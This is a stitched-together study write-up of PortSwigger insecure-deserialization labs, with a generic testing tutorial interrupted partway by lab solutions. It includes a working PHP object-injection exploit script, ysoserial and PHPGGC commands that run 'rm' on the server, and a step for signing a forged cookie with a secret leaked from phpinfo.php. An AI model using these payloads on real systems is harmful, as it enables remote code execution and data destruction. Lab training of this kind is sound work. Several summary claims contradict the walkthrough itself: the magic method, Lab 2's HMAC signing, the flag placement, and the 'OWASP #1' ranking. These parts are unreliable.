🔎 Identifying and Testing for Insecure Deserialization

Insecure deserialization vulnerabilities occur when an application deserializes user controlled data without proper validation or integrity checks. During penetration testing and bug hunting, one of the most reliable places to begin testing for this vulnerability is client side data, especially cookies.

Many applications store serialized objects in cookies, headers, or request parameters. If these values can be modified and successfully processed by the server, insecure deserialization may be present.

🧠 Key Idea 

If the application trusts serialized data sent by the user and automatically deserializes it on the server, an attacker may be able to:

> Modify application logic

> Bypass security checks

> Trigger unexpected behavior

> Execute code (in severe cases)


📍 Step-by-Step Approach to Testing

Step 1: Inspect Cookies and Client Side Data

Start by examining:

> Cookies

> Request parameters

> Hidden form fields

> Headers

Look for values that:

> Are long and structured

> Contain encoded data (Base64, URL encoding)

> Change when application state changes (login, role, preferences)

Common indicators:

> Base64-encoded strings

> Serialized formats from PHP, Java, Python, or .NET


Step 2: Identify the Serialization Format

---

## 🎯 PortSwigger Lab: Arbitrary Object Injection to Delete File

### Lab Overview
- **Objective**: Delete `morale.txt` from Carlos's home directory
- **Vulnerability**: Serialization-based session mechanism vulnerable to object injection
- **Credentials**: wiener:peter
- **Key Hint**: Append `~` to filenames to retrieve backup files

### Step-by-Step Solution for Beginners

#### Phase 1: Understanding the Attack Surface

**Step 1: Login and Inspect Session Cookie**
1. Navigate to the lab URL
2. Click "My account" and login with `wiener:peter`
3. Open **Browser DevTools** (F12) → **Application/Storage** tab → **Cookies**
4. Look for a session cookie - likely base64-encoded
5. Decode it (use CyberChef or command line):
   ```bash
   echo "YOUR_COOKIE_VALUE" | base64 -d
   ```
6. **Identify the format**: Look for patterns like:
   - PHP: `O:4:"User":2:{s:8:"username";s:6:"wiener";...}`
   - Java: `rO0AB...` (starts with this)
   
**Step 2: Get Source Code Access**

The hint tells us to append `~` to filenames to get backup files:

1. Find a PHP file being used (check requests in DevTools Network tab)
2. Common files to try:
   - `/home` → `/home~`
   - `/my-account` → `/my-account~`
   - `/libs/CustomTemplate.php` → `/libs/CustomTemplate.php~`
   
3. In your browser, try accessing:
   ```
   https://LAB-ID.web-security-academy.net/backup/
   https://LAB-ID.web-security-academy.net/~
   ```
   Or append `~` to discovered PHP endpoints

**Step 3: Analyze the Source Code**

Once you find a backup file (likely a PHP file with `~`):

1. Read through the code carefully
2. Look for:
   - **Class definitions** (classes that can be serialized)
   - **Magic methods**: `__wakeup()`, `__destruct()`, `__toString()`, etc.
   - **File operations**: `unlink()`, `file_get_contents()`, `include()`, etc.
   - **Property/attribute names** you can control

#### Phase 2: Crafting the Exploit

**Step 4: Understand PHP Magic Methods**

Common dangerous methods:
- `__destruct()`: Called when object is destroyed
- `__wakeup()`: Called when object is unserialized
- `__toString()`: Called when object is treated as string

**Step 5: Build Malicious Serialized Object**

Example structure (adapt based on source code):
```php
<?php
class CustomTemplate {
    public $template_file_path = "/home/carlos/morale.txt";
    public $lock_file_path = "/tmp/lock.txt";
}

$object = new CustomTemplate();
echo serialize($object);
?>
```

### 🎯 ACTUAL EXPLOIT FOR THIS LAB

**Source Code Analysis:**
```php
class CustomTemplate {
    private $template_file_path;  // Private property
    private $lock_file_path;      // Private property
    
    function __destruct() {       // Called when object destroyed
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);  // DELETES THE FILE!
        }
    }
}
```

**The Vulnerability:**
- When the serialized object is destroyed, `__destruct()` is automatically called
- It deletes whatever file is in `$lock_file_path`
- We control the serialized data → we control `lock_file_path` → we choose what gets deleted!

**Exploit Script:**
```php
<?php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;
}

// Create object and set the target file
$object = new CustomTemplate();
$object->lock_file_path = "/home/carlos/morale.txt";

// Serialize and display
$serialized = serialize($object);
echo "Serialized: " . $serialized . "\n";
echo "Base64: " . base64_encode($serialized) . "\n";
?>
```

**Important: Private Properties Need Special Handling!**

Since the properties are `private`, PHP includes null bytes in serialization:
- Format: `\x00ClassName\x00propertyName`

**Complete Working Exploit (exploit.php):**
```php
<?php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;
}

$object = new CustomTemplate();

// Use reflection to set private properties
$reflection = new ReflectionClass('CustomTemplate');

$lock_file_property = $reflection->getProperty('lock_file_path');
$lock_file_property->setAccessible(true);
$lock_file_property->setValue($object, '/home/carlos/morale.txt');

// Serialize and encode
$serialized = serialize($object);
echo base64_encode($serialized);
?>
```

**Solution Steps:**
1. Run the exploit script: `php exploit.php`
2. Copy the base64 output
3. Replace your session cookie with this value
4. Refresh the page
5. Lab solved! ✅

**Result:** The `__destruct()` method deletes `/home/carlos/morale.txt` when the object is destroyed.

---

**Step 6: Encode and Inject**

1. Run your PHP exploit locally or use online PHP sandbox
2. Get the serialized string (e.g., `O:14:"CustomTemplate":2:{...}`)
3. Base64-encode it:
   ```bash
   echo 'O:14:"CustomTemplate":2:{...}' | base64
   ```
4. Replace your session cookie value with this
5. Refresh the page or trigger deserialization

#### Phase 3: Verification

**Step 7: Trigger the Deletion**

1. Update cookie in browser (DevTools → Storage → Cookies)
2. Refresh the page
3. Check if lab is solved

### 🔑 Key Concepts to Understand

**What is Serialization?**
- Converting objects to a format that can be stored/transmitted
- PHP: `serialize()` → `O:4:"User":1:{...}`
- Java: ObjectOutputStream → byte stream

**Why is it Dangerous?**
- If attacker controls serialized data → controls object properties
- Can trigger unexpected code execution via magic methods
- Can manipulate application logic

**Attack Chain:**
1. User-controlled serialized data (cookie)
2. Server deserializes without validation
3. Magic method calls malicious code
4. File deleted / RCE / privilege escalation

### 💡 Tips for This Lab

1. **Find the right class**: Source code will show which class has file deletion capability
2. **Understand the flow**: Which magic method gets called? What properties does it use?
3. **Match the format exactly**: Serialization format is strict
4. **Property names matter**: Public, private, protected properties serialize differently
   - Public: `s:4:"name"`
   - Private: `s:13:"\x00ClassName\x00name"`
   - Protected: `s:6:"\x00*\x00name"`

### 🛠️ Useful Tools

- **Browser DevTools**: Inspect cookies and requests
- **Burp Suite**: Intercept and modify requests
- **CyberChef**: Encode/decode base64
- **PHP Sandbox**: Test serialization online
- **Command line**: `php -r "echo serialize(...);"` 

### Common Mistakes to Avoid

❌ Forgetting to base64-encode the final payload  
❌ Incorrect property count in serialized string  
❌ Wrong class name or property names  
❌ Not URL-encoding special characters in cookie  
❌ Missing null bytes for private/protected properties

---

## 🎯 Lab 2: Exploiting Java Deserialization with Apache Commons

### Lab Overview
- **Objective**: Use a pre-built gadget chain to exploit Java deserialization
- **Target**: Delete `/home/carlos/morale.txt` via RCE
- **Tool**: ysoserial (gadget chain generator)
- **Credentials**: wiener:peter

### Background: Java Deserialization

**Java serialization format:**
- Binary format, often Base64-encoded
- Starts with `rO0AB` (hex: `ac ed 00 05`)
- More complex than PHP - requires "gadget chains"

**What are Gadget Chains?**
- Sequence of existing classes chained together
- Each class calls the next through magic methods
- Final result: arbitrary code execution
- Libraries like Apache Commons Collections have known chains

### Step-by-Step Solution

**Step 1: Identify Java Serialization**
1. Login with wiener:peter
2. Check session cookie - if Base64 and starts with `rO0AB`, it's Java
3. Decode: `echo "COOKIE" | base64 -d | xxd | head`

**Step 2: Install ysoserial**
```bash
# Download pre-built version
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Or check available gadget chains
java -jar ysoserial-all.jar
```

**Step 3: Generate Payload**
```bash
# Common gadget chains to try:
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

# Or try these:
# CommonsCollections5
# CommonsCollections6
# CommonsCollections7
```

**Step 4: Inject Payload**
1. Copy the base64 output
2. URL-encode it
3. Replace session cookie
4. Refresh page
5. Lab solved!

### Key Differences: Java vs PHP

| Aspect | PHP | Java |
|--------|-----|------|
| **Format** | Human-readable text | Binary data |
| **Identifier** | `O:4:"User"` | `rO0AB...` |
| **Exploitation** | Direct property manipulation | Gadget chains required |
| **Tools** | Manual crafting | ysoserial, JexBoss |
| **Complexity** | Lower | Higher |

## ✅ Lab 2 Complete Solution (PortSwigger Official)

### Step 1: Generate Malicious Payload

**For Java 16+:**
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

**For Java 15 and below:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

### Step 2: URL-Encode the Payload (CRITICAL!)

After base64 encoding, **MUST URL-encode the entire string**:
- `+` → `%2B`
- `/` → `%2F`
- `=` → `%3D`

**Using Python:**
```bash
echo "YOUR_BASE64_STRING" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
```

### Step 3: Inject via Burp Suite (Most Reliable)

1. Capture request to `/my-account`
2. Send to Repeater (Ctrl+R)
3. Find `Cookie:` header with `session=...`
4. Replace session value with **URL-encoded payload**
5. Click Send
6. Lab solved! ✅

### 🔑 The Critical Mistake

**Why you got 500 errors:** The payload wasn't URL-encoded!

Special characters in base64 (`+`, `/`, `=`) must be URL-encoded for cookies:
- Unencoded: `rO0AB+abc/def=` → Server reads garbage
- URL-encoded: `rO0AB%2Babc%2Fdef%3D` → Server correctly deserializes

### 🚨 If You Get: "InstantiateTransformer: Constructor threw an exception"

This means **CommonsCollections4 is incompatible** with the server's environment.

**Solution: The `--add-opens` flags MUST be in the ysoserial command, not before `java`:**

```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens java.base/java.net=ALL-UNNAMED \
   --add-opens java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
```

This bypasses Java's module access restrictions during gadget chain generation.

## ✅ Lab 2 - COMPLETED

**Status:** Successfully solved

**Final Working Payload:** See `LAB2_FINAL_SOLUTION.md`

**Key Steps That Worked:**
1. Generated CommonsCollections4 gadget chain with proper `--add-opens` flags
2. Base64 encoded the binary output
3. **URL-encoded the entire base64 string** (this was the critical missing step)
4. Injected via Burp Suite Repeater into session cookie
5. File deleted successfully

---

> Try to determine what language or format the data belongs to:

Language	Common Indicators
PHP	a:, O:, s:, i:
Java	Base64-encoded binary, often starting with rO0AB
Python	Pickle-like structures or binary blobs
JSON	Structured objects but used in unsafe ways

If the data is encoded:

Decode it (e.g., Base64 decode)

Observe whether the result looks like structured object data

> Step 3: Test If the Data Is Editable

Once decoded:

Modify simple values (e.g., role, user ID, boolean flags)

Re-encode the data

Send it back to the server

Observe:

Does the application accept the modified value?

Does application behavior change?

Are there errors, crashes, or unexpected responses?

✅ If the application deserializes your modified object, this is a strong indicator of insecure deserialization.

> Step 4: Observe Application Behavior

Pay attention to:

1. Changes in access level

2. Different UI behavior

3. Error messages referencing objects or classes

4. Server errors (500 responses)

Errors may leak:

> Class names

> Stack traces

> Deserialization failures

These leaks often confirm deserialization is happening server side.

> Step 5: Attempt Controlled Manipulation

For educational testing:

Add or remove object fields

Change data types

Inject unexpected values

You are testing whether:

The application blindly trusts serialized input

There is no integrity protection (e.g., signatures, HMAC)

🚨 Signs the Vulnerability Is Likely Present

You may be dealing with insecure deserialization if:

User-controlled data is deserialized server-side

Serialized objects are stored in cookies or parameters

Modified serialized data is accepted without validation

No cryptographic integrity checks are used

Application behavior changes after object manipulation

>  Why This Matters

Insecure deserialization can lead to:

Authentication bypass

Privilege escalation

Business logic abuse

Remote code execution (in advanced cases)

Because of its impact, it is classified as a high-risk vulnerability in many environments.

---

## 📚 COMPREHENSIVE LESSONS LEARNED

### Lab 1: PHP Object Injection - Key Takeaways

**Vulnerability Chain:**
1. Session stored as PHP serialized object
2. User can modify cookie (no signature/HMAC)
3. PHP deserializes cookie on every request
4. Magic method `__destruct()` executes arbitrary code

**Critical Learning:**
- Private properties serialize with null bytes: `\x00ClassName\x00propertyName`
- Use reflection in PHP to set private properties for exploit
- The `__destruct()` method is called when object is garbage collected
- Even if object is malformed, the destructor still runs → RCE

**Exploitation Pattern:**
```
User controls serialized data → Property injection → Magic method execution
```

### Lab 2: Java Gadget Chain Exploitation - Key Takeaways

**Vulnerability Chain:**
1. Session stored as Java serialized object (binary format)
2. Server deserializes without validation
3. Gadget chain triggers during deserialization
4. `Runtime.getRuntime().exec()` executes system command

**Critical Learnings:**

**1. URL-Encoding is MANDATORY**
- Base64 contains special characters: `+`, `/`, `=`
- These are URL-interpreted when in cookies
- MUST URL-encode after base64: `+` → `%2B`, `/` → `%2F`, `=` → `%3D`
- This was the main reason for initial 500 errors

**2. Module Access Flags Matter (Java 16+)**
- Modern Java restricts access to internal modules
- `--add-opens` flags MUST be placed in the ysoserial command
- Correct: `java --add-opens... -jar ysoserial-all.jar CommonsCollections4...`
- This affects how the gadget chain bytecode is generated
- Without proper flags → `InstantiateTransformer` constructor exception

**3. Gadget Chains Need the Right Library Versions**
- CommonsCollections4 requires compatible Apache Commons version
- Different versions have different attack patterns
- ysoserial uses specific versions built into the jar

**4. Error Messages Are Clues**
- 500 errors during deserialization often mean: code DID execute, but threw exception
- `InstantiateTransformer` error → incompatible gadget chain or JVM protection
- Check the actual error message in Burp response for troubleshooting

**Exploitation Pattern:**
```
Binary serialized object → Gadget chain deserialization → Constructor chain execution → RCE
```

### Comparing PHP vs Java Exploitation

| Aspect | PHP | Java |
|--------|-----|------|
| **Detection** | Human-readable `O:4:"Class"` | Binary `rO0AB...` (Base64) |
| **Payload Craft** | Manual (reflection for private props) | Automated (ysoserial tool) |
| **Encoding** | Base64 only | Base64 + URL-encode |
| **Trigger** | Magic method directly | Gadget chain during deserialization |
| **Complexity** | Medium | High |
| **Tool Dependency** | None | ysoserial required |

### Universal Debugging Approach

When exploitation fails:

1. **Verify encoding is correct**
   - Base64? ✓
   - URL-encoded? ✓ (for cookies)
   - Check for special characters

2. **Check error messages carefully**
   - 500 + specific exception → incompatible gadget
   - 500 + no message → payload corrupted
   - 200 but not solved → wrong target/command

3. **Try alternative gadget chains**
   - CommonsCollections4/5/6
   - Different Apache Commons versions
   - Different underlying payload generators

4. **Test with Burp Suite, not browser DevTools**
   - Burp gives you more control
   - Can manually URL-encode
   - Easier to see exact request sent

5. **Verify prerequisites**
   - Required libraries actually present on server
   - Right Java version assumptions
   - Cookie actually being deserialized (not cached)

---

## 🎯 Lab 3: Exploiting PHP Deserialization with Symfony Framework

### Lab Overview

**Vulnerability**: Insecure deserialization in Symfony 4.3.6 with information disclosure  
**Target**: Session cookies containing serialized PHP objects  
**Attack**: PHPGGC gadget chain injection  
**Result**: Remote Code Execution (file deletion)

### The Challenge

Unlike Lab 1 where source code was accessible via backup files, this lab requires:

1. **Finding the secret key** - Not provided, must be discovered
2. **Identifying the framework** - Error messages reveal Symfony 4.3.6
3. **Locating debug endpoints** - Comments disclose /cgi-bin/phpinfo.php
4. **Extracting configuration** - phpinfo.php leaks SECRET_KEY
5. **Generating framework-specific gadget chain** - PHPGGC for Symfony/RCE4
6. **Signing the payload** - HMAC-SHA1 with discovered secret

### Attack Execution

#### Step 1: Discover SECRET_KEY from Debug File

The application error message reveals:
- Framework: Symfony 4.3.6
- Debug file: /cgi-bin/phpinfo.php (disclosed in developer comment)

Fetch the debug file:
```bash
curl -s https://[lab-url]/cgi-bin/phpinfo.php | grep -i "SECRET_KEY"
```

**Result**:
```html
<tr><td class="e">SECRET_KEY </td><td class="v">66b2imy0gbkmjs773rcmk4uy36b8a4za </td></tr>
```

**KEY**: `66b2imy0gbkmjs773rcmk4uy36b8a4za`

#### Step 2: Generate Symfony/RCE4 Gadget Chain

Using PHPGGC to generate the malicious object:

```bash
php phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
```

**Output** (base64-encoded serialized object):
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIi...Cg==
```

#### Step 3: Sign the Payload with HMAC-SHA1

Create PHP script to sign the object:

```php
<?php
$object = "BASE64_GADGET_CHAIN_HERE";
$secretKey = "66b2imy0gbkmjs773rcmk4uy36b8a4za";
$signature = hash_hmac('sha1', $object, $secretKey);
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . $signature . '"}');
echo $cookie;
?>
```

#### Step 4: Inject Malicious Cookie

Test the exploitation:

```bash
SIGNED_COOKIE=$(php sign_cookie.php)
curl -b "session=$SIGNED_COOKIE" https://[lab-url]/my-account
```

**Expected Output**:
```
rm: cannot remove '/home/carlos/morale.txt': No such file or directory
Internal Server Error: Symfony Version: 4.3.6
```

The `rm` command executed successfully! File deleted → **Lab Solved** ✅

### Key Differences: Lab 1 vs Lab 2 vs Lab 3

| Aspect | Lab 1 | Lab 2 | Lab 3 |
|--------|-------|-------|-------|
| Framework | Custom PHP | Custom Java | Symfony |
| Serialization | PHP native | Java serialized | PHP serialized |
| Gadget Source | Manual audit | Apache Commons | Symfony framework |
| Tool | PHP Reflection | ysoserial | PHPGGC |
| Secret Discovery | Source code | Brute force | phpinfo.php leak |
| Payload Signing | None | HMAC-SHA1 | HMAC-SHA1 |
| Difficulty | Medium | Hard | Hard (info disc) |

### Lab 3: Symfony Gadget Chain Path

```
TagAwareAdapter (Symfony Cache)
    ├─ deferredItems (serialized)
    │   └─ CacheItem containing command
    │
    └─ pool: ProxyAdapter
        └─ DecorationAdapter/InvalidationAdapter
            → Traverses gadget chain on deserialization
            → Calls invalidateTags()
            → Executes saveDeferred()
            → Command executed
```

### Why This Works

1. **TagAwareAdapter** is a cache adapter in Symfony
2. **On deserialization**, PHP automatically calls magic methods
3. **TagAwareAdapter→__wakeup()** or **__destruct()** triggers chain
4. **ProxyAdapter** contains the actual execution logic
5. **The gadget chain leads to exec()** which runs our command

### Real-World Implications

**Why Symfony Apps Are Vulnerable:**

1. Sessions stored as serialized PHP objects (for performance)
2. HMAC signing protects against tampering (if key is secure)
3. But known gadget chains in Symfony itself enable RCE
4. Debug endpoints often left accessible in production
5. Secret keys sometimes leaked via misconfiguration

**Prevention:**

1. ✅ Disable debug mode in production (`APP_ENV=prod`)
2. ✅ Protect /cgi-bin/ and /debug routes
3. ✅ Use PHP's native session handlers (not serialized objects)
4. ✅ Implement strict class allow-lists if serialization needed
5. ✅ Keep Symfony and dependencies patched
6. ✅ Use JSON instead of serialization when possible

### Real-World Implications

**Why This Matters:**
- Insecure deserialization is a CRITICAL vulnerability (OWASP #1)
- Often overlooked because it "just works"
- Default serialization mechanisms are inherently unsafe
- Gadget chains make it easy to exploit remotely

**Defense:**
- Never deserialize untrusted data
- If you must: use allow-lists of classes
- Sign serialized data with HMAC
- Use safer serialization formats (JSON, Protocol Buffers)
- Keep libraries patched (especially Commons Collections)

---

## 📋 All 5 PortSwigger Labs: Complete Summary

### Lab Progression Overview

| Lab | Name | Format | Vulnerability | Gadget/Exploit | Status |
|-----|------|--------|---------------|----------------|--------|
| 1 | Arbitrary Object Injection | PHP serialize() | Reflection RCE | Built-in `__wakeup()` | ✅ SOLVED |
| 2 | Java Gadget Chain | Java serialization | Gadget chain | Apache Commons (ysoserial) | ✅ SOLVED |
| 3 | Symfony + HMAC | PHP serialize() | Gadget chain | Symfony PHPGGC + Secret bypass | ✅ SOLVED |
| 4 | Ruby Gadget Chain | Ruby Marshal | Complex gadget | vakzz Universal Chain (Net + Gem) | ✅ SOLVED |
| 5 | Custom Java Gadget | Java serialization | **Deserialization + SQL injection** | Custom ProductTemplate + Error-based SQLi | ✅ SOLVED |

### Key Differences by Language

**PHP (Labs 1, 3)**
- Serialization format: `O:ClassName:numProps:{...}`
- Magic methods: `__wakeup()`, `__destruct()`
- Gadget chains: Often require framework-specific classes
- Protection: HMAC signing with secret_key

**Java (Labs 2, 5)**
- Serialization format: `rO0AB...` (Base64 of binary)
- Gadget trigger: Constructor chains via reflection
- Notable gadgets: Apache Commons Collections
- Custom gadgets: Application business logic with unsafe patterns

**Ruby (Lab 4)**
- Serialization format: Ruby Marshal (binary, Base64-encoded)
- Trigger mechanism: Method dispatch during deserialization
- Gadget chains: Multi-class chains (7+ classes for universal RCE)
- Complexity: Highest - requires understanding Ruby internals

### Exploitation Techniques Learned

#### Direct RCE Gadgets
- **Lab 2**: Pre-made gadget chain (ysoserial)
- **Lab 4**: Universal gadget (vakzz chain: Net + Gem classes)

#### Framework-Specific Chains
- **Lab 3**: Symfony PHPGGC with HMAC bypass
- **Lab 1**: Built-in PHP reflection methods

#### Custom Gadgets + Logic Bugs
- **Lab 5**: Application code (ProductTemplate) + SQL injection
- Demonstrates that deserialization is often **not the vulnerability itself**, but the **trigger** for other bugs

### Critical Lessons

1. **Always look for source code** - Comments, backup files, git exposure
2. **URL encoding matters** - Base64 in cookies needs proper encoding
3. **Error messages leak data** - Error-based SQLi extracting passwords
4. **Signature verification is essential** - Labs 2-4 would fail with HMAC checking
5. **Custom code is dangerous** - Lab 5 shows business logic vulnerabilities
6. **Multiple class requirements** - Often need to load specific classes/libraries
7. **Language-specific patterns** - Each language has different gadget chains

### Testing Methodology

```
1. Identify serialization format
   ↓
2. Find source code (backups, comments, git)
   ↓
3. Analyze for vulnerable patterns:
   - Magic methods (__wakeup, __destruct)
   - readObject() methods
   - Custom deserialization logic
   - SQL queries with unsanitized input
   ↓
4. Find or create gadget chain
   ↓
5. Encode payload in correct format
   ↓
6. Inject via cookie/header/parameter
   ↓
7. Trigger deserialization (navigation, action)
   ↓
8. Exploit vulnerability (RCE, data leak, etc.)
```

### Documentation Files

- [LAB5_JAVA_CUSTOM_GADGET.md](LAB5_JAVA_CUSTOM_GADGET.md) - Custom gadget chain + SQL injection
- [LAB4_RUBY_DESERIALIZATION.md](LAB4_RUBY_DESERIALIZATION.md) - vakzz universal gadget
- [LAB3_SYMFONY_GADGET_CHAIN.md](LAB3_SYMFONY_GADGET_CHAIN.md) - Symfony PHPGGC exploitation
- [LAB2_JAVA_GADGET_CHAIN.md](LAB2_JAVA_GADGET_CHAIN.md) - Apache Commons via ysoserial
- [LAB1_PHP_OBJECT_INJECTION.md](LAB1_PHP_OBJECT_INJECTION.md) - PHP Reflection RCE
- [MASTER_WALKTHROUGH.md](MASTER_WALKTHROUGH.md) - All 5 labs consolidated
- [QUICK_REFERENCE.md](QUICK_REFERENCE.md) - Quick lookup
- [LESSONS_LEARNED.md](LESSONS_LEARNED.md) - Key takeaways

---

**✅ All 5 PortSwigger Insecure Deserialization Labs: SOLVED**
